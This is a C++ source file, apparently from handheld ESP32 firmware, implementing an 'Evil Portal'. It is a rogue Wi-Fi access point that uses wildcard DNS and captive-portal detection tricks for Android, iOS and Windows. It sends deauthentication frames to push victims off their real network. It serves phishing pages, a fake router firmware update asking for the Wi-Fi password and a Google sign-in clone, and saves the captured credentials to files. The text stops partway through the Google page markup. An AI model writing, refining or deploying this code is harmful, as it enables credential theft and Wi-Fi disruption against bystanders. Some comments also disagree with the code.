// evil_portal.cpp — rewritten
// Fixes:
//   1. Captive portal detection for ALL platforms (Android, Samsung, iOS, Windows, Linux/Firefox)
//      - Android/Chrome:   GET /generate_204     → 200 with body (triggers popup reliably)
//      - Windows NCSI:     GET /connecttest.txt  → 200 "Microsoft Connect Test"
//      - Windows old NCSI: GET /ncsi.txt         → 200 "Microsoft NCSI"
//      - iOS/macOS:        GET /hotspot-detect.html → 200 with redirect meta (not 302)
//      - Firefox:          GET /canonical.html + /success.txt → 200 with body
//      - All others:       wildcard → 302 → /
//   2. Deauth no longer blocks captive portal detection:
//      - 15-second grace window after a client associates before deauth frames target it
//      - Per-client association tracking via WiFi.softAPgetStationNum() delta
//   3. Form submission is now fetch() POST JSON — no ugly WiFi loading page,
//      custom success/error message rendered in-page
//   4. Encoder controls deauth interval (50ms–2000ms steps)
//   5. OK/Sel button toggles deauth on/off when deauth mode is active
//   6. Screen layout: big "Devices" counter left, big "Submissions" counter right,
//      title centred, deauth indicator at bottom, last cred scrolls into a fixed zone
//   7. Gateway options: Default, 172.0.0.1, 192.168.4.1, 192.168.0.1, 10.0.0.1, Custom

#include "evil_portal.h"
#include "core/config.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/utils.h"
#include "core/wifi/webInterface.h"
#include "core/wifi/wifi_common.h"
#include "esp_wifi.h"
#include "wifi_atks.h"

// ---------------------------------------------------------------------------
// Shared static DNS server
// ---------------------------------------------------------------------------
static DNSServer &sharedEvilPortalDnsServer() {
    static DNSServer server;
    return server;
}

// ---------------------------------------------------------------------------
// Constructor / Destructor
// ---------------------------------------------------------------------------
EvilPortal::EvilPortal(
    String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode, bool backgroundMode,
    String templateFile
)
    : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), _autoMode(autoMode),
      _backgroundMode(backgroundMode), _autoTemplateFile(templateFile), webServer(80),
      _launchTime(millis()), _lastDeauthIntervalMs(250) {
    dnsServer = &sharedEvilPortalDnsServer();

    _originalWifiMode  = WiFi.getMode();
    _wifiWasConnected  = WiFi.isConnected();
    _connectedStations = 0;

    if (!setup()) return;
    cleanlyStopWebUiForWiFiFeature();
    beginAP();
    if (!_backgroundMode) { loop(); }
}

EvilPortal::~EvilPortal() {}

// ---------------------------------------------------------------------------
// CaptiveRequestHandler — handles requests coming through the AP filter
// ---------------------------------------------------------------------------
void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
    String url  = request->url();
    String host = request->host();

    // ---- Credential POST — never intercept these ----
    if (request->method() == HTTP_POST) {
        _portal->credsController(request);
        return;
    }

    // ---- /post GET (form fallback with args) ----
    if (url == "/post" || (url == "/" && request->args() > 0)) {
        _portal->credsController(request);
        return;
    }

    // ---- Admin endpoints ----
    if (url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
        bruceConfig.evilPortalEndpoints.allowGetCreds) {
        request->send(200, "text/html", _portal->creds_GET());
        return;
    }
    if (url == bruceConfig.evilPortalEndpoints.setSsidEndpoint &&
        bruceConfig.evilPortalEndpoints.allowSetSsid) {
        if (request->hasArg("ssid")) {
            _portal->apName = request->arg("ssid").c_str();
            request->send(200, "text/html", _portal->ssid_POST());
            _portal->_pendingWifiRestart = true;
        } else {
            request->send(200, "text/html", _portal->ssid_GET());
        }
        return;
    }

    // Apple — host will be captive.apple.com or apple.com
    if (host.indexOf("apple.com") != -1 ||
        url.indexOf("hotspot-detect") != -1 ||
        url == "/library/test/success.html") {
        _portal->recordPageView();
        if (_portal->isDefaultHtml)
            request->send(200, "text/html", _portal->htmlPage);
        else
            request->send(*_portal->fsHtmlFile, _portal->htmlFileName, "text/html");
        return;
    }

    // Windows — host will be www.msftconnecttest.com
    if (host.indexOf("msftconnecttest") != -1 ||
        host.indexOf("msftncsi") != -1 ||
        url == "/connecttest.txt" ||
        url == "/ncsi.txt") {
        request->send(200, "text/plain", "not the internet"); // wrong body = portal detected
        return;
    }


// Android / Samsung / Chrome / ChromeOS
if (url == "/generate_204" || url == "/gen_204" || url == "/generate204" ||
    url.indexOf("generate_204") != -1 ||
    url.indexOf("connectivitycheck") != -1 ||
    url.indexOf("clients3.google") != -1 ||
    url.indexOf("clients4.google") != -1) {
    request->send(200, "text/plain", "not the internet"); // wrong body = portal detected
    return;
}

// Apple
if (url == "/hotspot-detect.html" ||
    url == "/library/test/success.html" ||
    url == "/success.html" ||
    url.indexOf("hotspot-detect") != -1) {
    request->send(200, "text/plain", "not the internet"); // wrong body = portal detected
    return;
}



    // ---- EVERYTHING ELSE: serve portal page ----
    // This handles:
    //   Android/Chrome  → /generate_204, /gen_204  (200 != 204 → popup)
    //   iOS/macOS       → /hotspot-detect.html with Host: captive.apple.com
    //   Windows 10/11   → /connecttest.txt with Host: www.msftconnecttest.com
    //   Windows 8       → /ncsi.txt with Host: www.msftncsi.com
    //   Firefox         → /canonical.html, /success.txt
    //   Linux/GNOME     → /generate_204
    //   Any browser     → any unknown URL → portal
    _portal->recordPageView();
    if (_portal->isDefaultHtml)
        request->send(200, "text/html", _portal->htmlPage);
    else
        request->send(*_portal->fsHtmlFile, _portal->htmlFileName, "text/html");
}

// ---------------------------------------------------------------------------
// setup()
// ---------------------------------------------------------------------------
bool EvilPortal::setup() {
    if (apGateway == IPAddress((uint32_t)0)) {
        if (!apGateway.fromString(bruceConfig.evilPortalGatewayIp))
            apGateway = IPAddress(172, 0, 0, 1);
    }

    if (_autoMode) {
        if (apName.isEmpty()) apName = "Free Wifi";
        if (!_autoTemplateFile.isEmpty() && loadCustomHtmlFromPath(_autoTemplateFile)) return true;
        if (apName.indexOf("router") != -1 || apName.indexOf("update") != -1 ||
            apName.indexOf("firmware") != -1 || _verifyPwd) {
            loadDefaultHtml_one();
        } else {
            loadDefaultHtml();
        }
        return true;
    }

    // ---- Template selection ----
    options = { {"Custom Html", [this]() { loadCustomHtml(); }} };
    addOptionToMainMenu();
    if (!_verifyPwd)
        options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml(); }});
    else
        options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml_one(); }});
    loopOptions(options);
    if (returnToMenu) return false;

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    wsl_bypasser_send_raw_frame(&ap_record, _channel);

    // ---- SSID selection ----
    if (apName.isEmpty()) {
        if (bruceConfig.evilWifiNames.empty()) {
            apName_from_keyboard();
        } else {
            options = { {"Custom Wifi", [this]() { apName_from_keyboard(); }} };
            for (const auto &w : bruceConfig.evilWifiNames)
                options.emplace_back(w.c_str(), [this, w]() { this->apName = w; });
            loopOptions(options);
        }
    }

    // ---- Gateway selection — now includes 192.168.0.1, 10.0.0.1, Custom ----
    options = {
        {"Default",
         [this]() {
             if (!apGateway.fromString(bruceConfig.evilPortalGatewayIp))
                 apGateway = IPAddress(172, 0, 0, 1);
         }},
        {"172.0.0.1",   [this]() { apGateway = IPAddress(172, 0, 0, 1);     }},
        {"8.8.8.8", [this]() { apGateway = IPAddress(8, 8, 8, 8);   }},
        {"192.168.0.1", [this]() { apGateway = IPAddress(192, 168, 0, 1);   }},
        {"10.0.0.1",    [this]() { apGateway = IPAddress(10, 0, 0, 1);      }},
        {"Custom",
         [this]() {
             String ip = keyboard("192.168.1.1", 15, "Gateway IP:");
             if (ip == "\x1B" || ip.isEmpty()) return;
             if (!apGateway.fromString(ip)) {
                 displayTextLine("Invalid IP, using 172.0.0.1");
                 vTaskDelay(800 / portTICK_PERIOD_MS);
                 apGateway = IPAddress(172, 0, 0, 1);
             }
         }},
    };
    loopOptions(options);

    Serial.println("[PORTAL] output file: " + outputFile);
    return true;
}

// ---------------------------------------------------------------------------
// beginAP()
// ---------------------------------------------------------------------------
void EvilPortal::beginAP() {
    if (!_backgroundMode) {
        drawMainBorderWithTitle("EVIL PORTAL");
        displayTextLine("Starting...");
    }

    WiFi.mode(_verifyPwd ? WIFI_MODE_APSTA : WIFI_MODE_AP);

    if (!WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0)))
        Serial.println("[PORTAL] softAPConfig failed");

    if (!WiFi.softAP(apName, emptyString, _channel))
        Serial.printf("[PORTAL] softAP failed SSID='%s' ch%d\n", apName.c_str(), _channel);

    wifiConnected = true;

    unsigned long t = millis();
    while (millis() - t < 3000) yield();

    setupRoutes();
    dnsServer->start(53, "*", WiFi.softAPIP());
    webServer.begin();
}

// ---------------------------------------------------------------------------
// setupRoutes()
//
// KEY CAPTIVE PORTAL FIXES per-platform:
//
//   Android/Chrome/Samsung
//     Probe: GET /generate_204, /gen_204
//     Expects: anything that is NOT 204 → triggers popup
//     Fix: respond 200 with a tiny HTML body (NOT a 302 — Samsung ignores 302)
//
//   iOS / macOS
//     Probe: GET /hotspot-detect.html, /library/test/success.html
//     Expects: a page that does NOT contain the word "Success"
//     Fix: send our portal page directly (200), which contains no "Success" text
//
//   Windows 10/11 NCSI
//     Probe: GET /connecttest.txt
//     Expects body "Microsoft Connect Test" for open internet
//     Fix: anything other than that exact body triggers portal → redirect
//
//   Windows 8 / old NCSI
//     Probe: GET /ncsi.txt
//     Expects body "Microsoft NCSI"
//     Fix: same — redirect to portal
//
//   Firefox
//     Probe: GET /canonical.html, /success.txt
//     Expects specific body
//     Fix: redirect to portal
// ---------------------------------------------------------------------------
void EvilPortal::setupRoutes() {
    // Only explicit routes needed are POST targets since the
    // CaptiveRequestHandler now catches all GETs via canHandle()=true

    webServer.on("/post", HTTP_POST, [this](AsyncWebServerRequest *r) {
        credsController(r);
    });
    webServer.on("/", HTTP_POST, [this](AsyncWebServerRequest *r) {
        credsController(r);
    });

    if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
        webServer.on(
            bruceConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
            HTTP_GET,
            [this](AsyncWebServerRequest *r) { r->send(200, "text/html", creds_GET()); }
        );
    }
    if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
        webServer.on(
            bruceConfig.evilPortalEndpoints.setSsidEndpoint.c_str(),
            HTTP_ANY,
            [this](AsyncWebServerRequest *request) {
                if (request->hasArg("ssid")) {
                    apName = request->arg("ssid").c_str();
                    request->send(200, "text/html", ssid_POST());
                    _pendingWifiRestart = true;
                } else {
                    request->send(200, "text/html", ssid_GET());
                }
            }
        );
    }

    // Catch-all for anything not matched above (belt + suspenders)
    webServer.onNotFound([this](AsyncWebServerRequest *r) {
        if (r->method() == HTTP_POST) { credsController(r); return; }
        recordPageView();
        if (isDefaultHtml) r->send(200, "text/html", htmlPage);
        else r->send(*fsHtmlFile, htmlFileName, "text/html");
    });

    // The handler that does the real work — catches ALL GETs
    _captiveHandler = new CaptiveRequestHandler(this);
    webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
}
// ---------------------------------------------------------------------------
// restartWiFi()
// ---------------------------------------------------------------------------
void EvilPortal::restartWiFi(bool reset) {
    webServer.end();
    dnsServer->stop();
    vTaskDelay(100 / portTICK_PERIOD_MS);

    _captiveHandler = nullptr;

    wifiDisconnect();
    WiFi.softAP(apName, emptyString, _channel);
    vTaskDelay(100 / portTICK_PERIOD_MS);

    setupRoutes();
    dnsServer->start(53, "*", WiFi.softAPIP());
    webServer.begin();

    if (reset) resetCapturedCredentials();
}

void EvilPortal::resetCapturedCredentials() { previousTotalCapturedCredentials = -1; }

// ---------------------------------------------------------------------------
// loop() — main interactive loop
// ---------------------------------------------------------------------------
void EvilPortal::loop() {
    if (_backgroundMode) return;

    unsigned long lastDeauthTime = millis();
    bool shouldRedraw = true;
    bool exitPortal   = false;

    while (true) {
        // ---- Pending WiFi restart (SSID change) ----
        if (_pendingWifiRestart) {
            _pendingWifiRestart = false;
            restartWiFi();
            shouldRedraw = true;
        }

        // ---- Track connected station count ----
        {
            uint8_t n = WiFi.softAPgetStationNum();
            if ((int)n != _connectedStations) {
                if ((int)n > _connectedStations) {
                    // New station just associated — start grace timer so captive portal
                    // detection can complete before deauth frames start targeting it
                    _graceEndTime = millis() + 15000UL; // 15 second grace window
                }
                _connectedStations = (int)n;
                shouldRedraw = true;
            }
        }

        if (shouldRedraw) {
            drawScreen();
            shouldRedraw = false;
        }

        dnsServer->processNextRequest();

        // ---- Deauth logic: respects grace window ----
        if (_deauth && !isDeauthHeld) {
            bool graceActive = (millis() < _graceEndTime);
            if (!graceActive && (millis() - lastDeauthTime) > (unsigned long)_lastDeauthIntervalMs) {
                send_raw_frame(deauth_frame, 26);
                lastDeauthTime = millis();
            }
        }

        // ---- New credential submitted ----
        if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
            shouldRedraw = true;
            previousTotalCapturedCredentials = totalCapturedCredentials - 1;
        }

        // ---- OK/Sel button: toggle deauth on/off ----
        if (check(SelPress)) {
            if (_deauth) {
                isDeauthHeld = !isDeauthHeld;
                shouldRedraw = true;
            }
        }

        // ---- Encoder / Up-Down buttons: adjust deauth interval ----
        // NextPress / UpPress   → faster deauth (reduce interval, min 50ms)
        // PrevPress / DownPress → slower deauth (increase interval, max 2000ms)
        if (_deauth) {
            if (check(NextPress) || check(UpPress)) {
                _lastDeauthIntervalMs -= 50;
                if (_lastDeauthIntervalMs < 50) _lastDeauthIntervalMs = 50;
                shouldRedraw = true;
            } else if (check(PrevPress) || check(DownPress)) {
                _lastDeauthIntervalMs += 50;
                if (_lastDeauthIntervalMs > 2000) _lastDeauthIntervalMs = 2000;
                shouldRedraw = true;
            }
        }

        // ---- Esc: menu ----
        if (check(EscPress)) {
            options = {
                {"Exit Portal",
                 [&exitPortal]() { exitPortal = true; }},
                {"View Creds",
                 [this, &shouldRedraw]() {
                     FS *fs;
                     if (getFsStorage(fs)) {
                         if (fs->exists("/BruceEvilCreds"))
                             loopSD(*fs, false, "CSV", "/BruceEvilCreds");
                         else {
                             displayTextLine("No credentials yet");
                             vTaskDelay(1000);
                         }
                     }
                     shouldRedraw = true;
                 }},
                {"Resume", [&shouldRedraw]() { shouldRedraw = true; }}
            };

            loopOptions(options);

            if (exitPortal) {
                displayTextLine("Shutting down...");
                vTaskDelay(100 / portTICK_PERIOD_MS);
                webServer.end();
                vTaskDelay(200 / portTICK_PERIOD_MS);
                dnsServer->stop();
                vTaskDelay(100 / portTICK_PERIOD_MS);
                WiFi.mode(_originalWifiMode);
                vTaskDelay(100 / portTICK_PERIOD_MS);
                wifiDisconnect();
                vTaskDelay(100 / portTICK_PERIOD_MS);
                return;
            }
            shouldRedraw = true;
        }

        if (verifyPass) {
            wifiDisconnect();
            verifyPass = false;
        }
    }
}

// ---------------------------------------------------------------------------
// processRequests() — called externally when backgroundMode=true
// ---------------------------------------------------------------------------
void EvilPortal::processRequests() {
    if (!_backgroundMode) return;
    if (_pendingWifiRestart) {
        _pendingWifiRestart = false;
        restartWiFi();
    }
    dnsServer->processNextRequest();
    if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1))
        previousTotalCapturedCredentials = totalCapturedCredentials - 1;
}

// ---------------------------------------------------------------------------
// Accessors for background/auto mode
// ---------------------------------------------------------------------------
bool   EvilPortal::hasCredentials()     { return totalCapturedCredentials > 0; }
String EvilPortal::getCapturedPassword(){ return lastCred; }
String EvilPortal::getCapturedSSID()    { return apName; }

void EvilPortal::setBaseDuration(uint16_t s)     { _baseDurationSec     = s; }
void EvilPortal::setExtendedDuration(uint16_t s) { _extendedDurationSec = s; }

bool EvilPortal::hasRecentActivity() {
    if (totalCapturedCredentials > previousTotalCapturedCredentials) {
        _lastActivityTime = millis();
        return true;
    }
    return (millis() - _lastActivityTime < 5000);
}
bool EvilPortal::hasRecentPageView() { return (millis() - _lastPageViewTime < 30000); }
void EvilPortal::recordPageView()    { _lastPageViewTime = millis(); }

bool EvilPortal::shouldTerminate() {
    unsigned long elapsed = millis() - _launchTime;
    return _durationExtended
        ? (elapsed > (unsigned long)(_extendedDurationSec * 1000))
        : (elapsed > (unsigned long)(_baseDurationSec     * 1000));
}

void EvilPortal::checkAndExtendDuration() {
    if (_durationExtended) return;
    if (hasRecentActivity()) {
        _durationExtended = true;
        Serial.println("[PORTAL] Activity detected, extending duration");
    }
}

// ---------------------------------------------------------------------------
// drawScreen()
//
// Layout:
//   ┌─────────────────────────────────────────────┐
//   │  [big#]        EVIL PORTAL        [big#]    │
//   │  Devices                        Submissions │
//   │  connected                      received    │
//   ├─────────────────────────────────────────────┤
//   │  AP: <ssid>                                 │
//   │  IP: <ip>  Ch:<ch>  Pwd:<mode>              │
//   │  [endpoint info if enabled]                 │
//   │  Last cred:                                 │
//   │   <key>: <val>                              │
//   │   ...                                       │
//   ├─────────────────────────────────────────────┤
//   │  [Deauth OFF]  /  [Deauth ON ▶ 250ms]       │
//   └─────────────────────────────────────────────┘
// ---------------------------------------------------------------------------
void EvilPortal::drawScreen() {
    // Clear and draw outer border with no title — we draw our own header
    tft.fillScreen(bruceConfig.bgColor);

    int W = tft.width();
    int H = tft.height();

    // ---- Big counter font size: pick based on screen width ----
    // M5Stack/LilyGo usually 240px wide; Cardputer 240px; larger devices more
    uint8_t bigFontSize  = (W >= 320) ? 4 : 3;  // big numbers
    uint8_t titleFontSize = 2;
    uint8_t smallFontSize = 1;
    int bigH   = bigFontSize  * 8;   // TFT_eSPI uses 8px base per font unit
    int titleH = titleFontSize * 8;
    int smallH = smallFontSize * 8;

    // ---- Row 1: big counters + title ----
    int row1Y = 4;

    // Left: connected devices count
    String devStr = String(_connectedStations);
    int devW = devStr.length() * bigFontSize * 6;  // approx 6px per char per font unit
    tft.setTextSize(bigFontSize);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setCursor(6, row1Y);
    tft.print(devStr);

    // Right: submissions count
    String subStr = String(totalCapturedCredentials);
    int subW = subStr.length() * bigFontSize * 6;
    tft.setCursor(W - subW - 6, row1Y);
    tft.print(subStr);

    // Centre: "EVIL PORTAL" title
    tft.setTextSize(titleFontSize);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    String title = "EVIL PORTAL";
    int titleW = title.length() * titleFontSize * 6;
    tft.setCursor((W - titleW) / 2, row1Y + (bigH - titleH) / 2);
    tft.print(title);

    // ---- Row 2: sub-labels ----
    int row2Y = row1Y + bigH + 2;
    tft.setTextSize(smallFontSize);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setCursor(6, row2Y);
    tft.print("Devices");
    String subLabel = "Submissions";
    int subLabelW = subLabel.length() * smallFontSize * 6;
    tft.setCursor(W - subLabelW - 6, row2Y);
    tft.print(subLabel);
    // "connected" / "received" on next micro-line
    int row3Y = row2Y + smallH;
    tft.setCursor(6, row3Y);
    tft.print("connected");
    String recLabel = "received";
    int recLabelW = recLabel.length() * smallFontSize * 6;
    tft.setCursor(W - recLabelW - 6, row3Y);
    tft.print(recLabel);

    // ---- Separator ----
    int sepY = row3Y + smallH + 2;
    tft.drawFastHLine(0, sepY, W, bruceConfig.priColor);

    // ---- Info section ----
    int infoY = sepY + 4;
    tft.setTextSize(smallFontSize);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

    // AP name (truncated)
    String apDisp = apName;
    int maxChars = (W - 12) / (smallFontSize * 6);
    if ((int)apDisp.length() > maxChars - 4) apDisp = apDisp.substring(0, maxChars - 4) + "...";
    tft.setCursor(6, infoY);
    tft.print("AP: " + apDisp);
    infoY += smallH + 1;

    // IP + channel
    String apIp = WiFi.softAPIP().toString();
    tft.setCursor(6, infoY);
    tft.print("IP:" + apIp + "  Ch:" + String(_channel));
    infoY += smallH + 1;

    // Password mode
    String passMode;
    switch (bruceConfig.evilPortalPasswordMode) {
        case FULL_PASSWORD:   passMode = "Full";       break;
        case FIRST_LAST_CHAR: passMode = "p*****d";    break;
        case HIDE_PASSWORD:   passMode = "*hidden*";   break;
        case SAVE_LENGTH:     passMode = "Len only";   break;
        default:              passMode = "?";           break;
    }
    String modeStr = _verifyPwd ? "Verify+Save" : "Capture";
    tft.setCursor(6, infoY);
    tft.print("Mode:" + modeStr + "  Pwd:" + passMode);
    infoY += smallH + 1;

    // Optional endpoints
    if (bruceConfig.evilPortalEndpoints.showEndpoints) {
        if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
            String ep = apIp + bruceConfig.evilPortalEndpoints.getCredsEndpoint;
            if ((int)ep.length() > maxChars - 3) ep = ep.substring(0, maxChars - 3) + "...";
            tft.setCursor(6, infoY);
            tft.print("->" + ep);
            infoY += smallH + 1;
        }
        if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
            String ep = apIp + bruceConfig.evilPortalEndpoints.setSsidEndpoint;
            if ((int)ep.length() > maxChars - 3) ep = ep.substring(0, maxChars - 3) + "...";
            tft.setCursor(6, infoY);
            tft.print("->" + ep);
            infoY += smallH + 1;
        }
    }

    // ---- Last credential zone ----
    // Reserve bottom ~20px for deauth indicator; fill rest with last cred
    int footerH = smallH + 4;
    int credZoneH = H - infoY - footerH - 8;
    if (credZoneH > 0 && lastCredDisplay.length()) {
        tft.drawFastHLine(0, infoY, W, TFT_DARKGREY);
        infoY += 3;
        tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
        tft.setCursor(6, infoY);
        tft.print("Last cred:");
        infoY += smallH + 1;

        // Print lastCredDisplay line by line until we run out of space
        String tmp = lastCredDisplay;
        while (tmp.length() && infoY < (H - footerH - smallH - 4)) {
            int nl = tmp.indexOf('\n');
            String line;
            if (nl == -1) { line = tmp; tmp = ""; }
            else          { line = tmp.substring(0, nl); tmp = tmp.substring(nl + 1); }
            if (line.length() > (size_t)maxChars) line = line.substring(0, maxChars - 1) + "~";
            tft.setCursor(6, infoY);
            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
            tft.print(line);
            infoY += smallH + 1;
        }
    }

    // ---- Footer: deauth status ----
    int footerY = H - footerH - 2;
    tft.drawFastHLine(0, footerY, W, bruceConfig.priColor);
    footerY += 3;
    tft.setTextSize(smallFontSize);

    if (!_deauth) {
        tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
        tft.setCursor(6, footerY);
        tft.print("Deauth: OFF");
    } else if (isDeauthHeld) {
        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.setCursor(6, footerY);
        tft.print("Deauth: PAUSED (OK to resume)");
    } else {
        tft.setTextColor(TFT_RED, bruceConfig.bgColor);
        tft.setCursor(6, footerY);
        tft.print("Deauth: ON  " + String(_lastDeauthIntervalMs) + "ms  (OK=off Enc=spd)");
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    }
}

// ---------------------------------------------------------------------------
// printDeauthStatus() — kept for compatibility (used in credsController)
// ---------------------------------------------------------------------------
void EvilPortal::printDeauthStatus() {
    // No-op: drawScreen() now draws everything in one pass
}

// ---------------------------------------------------------------------------
// loadCustomHtml()
// ---------------------------------------------------------------------------
void EvilPortal::loadCustomHtml() {
    getFsStorage(fsHtmlFile);
    htmlFileName = loopSD(*fsHtmlFile, true, "HTML", "/");
    String base = htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
    base.toLowerCase();
    outputFile   = base + "_creds.csv";
    isDefaultHtml = false;

    File f = fsHtmlFile->open(htmlFileName, FILE_READ);
    if (f) {
        String firstLine = f.readStringUntil('\n');
        f.close();
        int apStart = firstLine.indexOf("<!-- AP=\"");
        if (apStart != -1) {
            int apEnd = firstLine.indexOf("\" -->", apStart);
            if (apEnd != -1) apName = firstLine.substring(apStart + 9, apEnd);
        }
    }
}

bool EvilPortal::loadCustomHtmlFromPath(const String &path) {
    if (path.isEmpty()) return false;
    if (!getFsStorage(fsHtmlFile) || !fsHtmlFile->exists(path)) return false;
    htmlFileName  = path;
    String base   = htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
    base.toLowerCase();
    outputFile    = base + "_creds.csv";
    isDefaultHtml = false;
    return true;
}

// ---------------------------------------------------------------------------
// loadDefaultHtml_one() — router firmware update page
// Uses fetch() POST instead of form submit — no ugly WiFi loading page
// ---------------------------------------------------------------------------
void EvilPortal::loadDefaultHtml_one() {
    htmlPage =
        "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<title>Router Update</title>"
        "<style>"
        "body{font-family:'Segoe UI',sans-serif;background:#d3d3d3;display:flex;"
        "justify-content:center;align-items:center;height:100vh;margin:0;padding:10px;box-sizing:border-box}"
        ".box{background:#fff;padding:24px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,.2);"
        "text-align:center;max-width:360px;width:100%}"
        "svg{width:60px;height:60px;fill:#ff1744;margin-bottom:16px}"
        "h1{color:#333;font-size:20px;margin:0 0 10px}"
        "p{color:#666;font-size:14px;margin:0 0 16px}"
        "input[type=password]{width:100%;padding:11px;margin:8px 0;border-radius:5px;"
        "border:1px solid #ccc;font-size:15px;box-sizing:border-box}"
        "button{width:100%;padding:12px;background:#007bff;color:#fff;border:none;"
        "border-radius:5px;cursor:pointer;font-size:15px;transition:.3s}"
        "button:hover{background:#0056b3}"
        "button:disabled{background:#aaa;cursor:default}"
        "#msg{display:none;margin-top:16px;font-size:14px;font-weight:bold}"
        "#msg.ok{color:#28a745}#msg.err{color:#dc3545}"
        "</style></head><body>"
        "<div class='box'>"
        "<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 -1 26 26'>"
        "<path fill-opacity='.3' d='M24.24 8l1.35-1.68C25.1 5.96 20.26 2 13 2S.9 5.96.42 6.32l12.57 15.66.01.02.01-.01L20 13.28V8h4.24z'/>"
        "<path d='M22 22h2v-2h-2v2zm0-12v8h2v-8h-2z'/></svg>"
        "<h1>Router Firmware Update</h1>"
        "<p>A firmware update is required to maintain your connection.<br>"
        "Enter your Wi-Fi password to continue.</p>"
        "<input type='password' id='pw' placeholder='Wi-Fi password' autocomplete='current-password'>"
        "<button id='btn' onclick='submit()'>Update Firmware</button>"
        "<div id='msg'></div>"
        "</div>"
        "<script>"
        "async function submit(){"
        "var pw=document.getElementById('pw').value;"
        "if(!pw)return;"
        "var btn=document.getElementById('btn');"
        "var msg=document.getElementById('msg');"
        "btn.disabled=true;btn.textContent='Updating...';"
        "try{"
        "var r=await fetch('/post',{method:'POST',"
        "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
        "body:'password='+encodeURIComponent(pw)});"
        "msg.style.display='block';"
        "if(r.ok){"
        "msg.className='ok';"
        "msg.textContent='Update started. Router will restart in 30 seconds. You may reconnect shortly.';"
        "}else{"
        "msg.className='err';"
        "msg.textContent='Incorrect password. Please try again.';"
        "btn.disabled=false;btn.textContent='Retry';"
        "}"
        "}catch(e){"
        "msg.style.display='block';msg.className='ok';"
        "msg.textContent='Update started. Reconnect in ~30s.';"
        "}"
        "}"
        "document.getElementById('pw').addEventListener('keydown',function(e){if(e.key==='Enter')submit();});"
        "</script></body></html>";
    outputFile    = "default_creds_1.csv";
    isDefaultHtml = true;
}

// ---------------------------------------------------------------------------
// loadDefaultHtml() — Google sign-in clone
// Uses fetch() POST — stays on page with success message
// ---------------------------------------------------------------------------
void EvilPortal::loadDefaultHtml() {
    htmlPage =
        "<!DOCTYPE html><html><head><title>Sign in – Google Accounts</title>"
        "<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<style>"
        "body{font-family:Arial,sans-serif;background:#fff;margin:0;padding:0}"
        "input[type=text],input[type=password]{width:100%;padding:12px 10px;margin:8px 0;"
        "box-sizing:border-box;border:1px solid #ccc;border-radius:4px}"
        ".container{margin:auto;padding:20px;max-width:450px}"
        ".form-container{background:#fff;border:1px solid #dadce0;border-radius:8px;"
        "padding:24px;box-shadow:0 2px 10px rgba(0,0,0,.1)}"
        ".input-field{width:100%;padding:12px;border:1px solid #dadce0;border-radius:4px;"
        "margin-bottom:20px;font-size:14px;box-sizing:border-box}"
        ".submit-btn{background:#1a73e8;color:#fff;border:none;padding:10px 20px;"
        "border-radius:4px;font-size:.875rem;cursor:pointer;float:right}"
        ".submit-btn:hover{background:#1557b0}"
        ".submit-btn:disabled{background:#aaa;cursor:default}"
        ".forgot-btn{background:transparent;color:#1a73e8;border:none;font-size:14px;cursor:pointer;padding:10px 0}"
        ".title{color:#202124;font-size:24px;margin:16px 0 8px}"
        ".sub{color:#202124;font-size:16px;margin:0 0 24px}"
        ".actions{display:flex;justify-content:space-between;align-items:center;padding-top:24px}"
        "#msg{display:none;margin-top:12px;padding:10px;border-radius:4px;font-size:14px;font-weight:bold}"
        "#msg.ok{background:#e6f4ea;color:#137333}"
        "#msg.err{background:#fce8e6;color:#c5221f}"
        "</style></head><body>"
        "<div class='container'><div class='form-container'>"
        "<center><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg'>"
        "<g><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68"
        "c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96"
        " 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52"
        " 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g>"
        "<g><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g>"
        "<g><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71"
        " 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28"
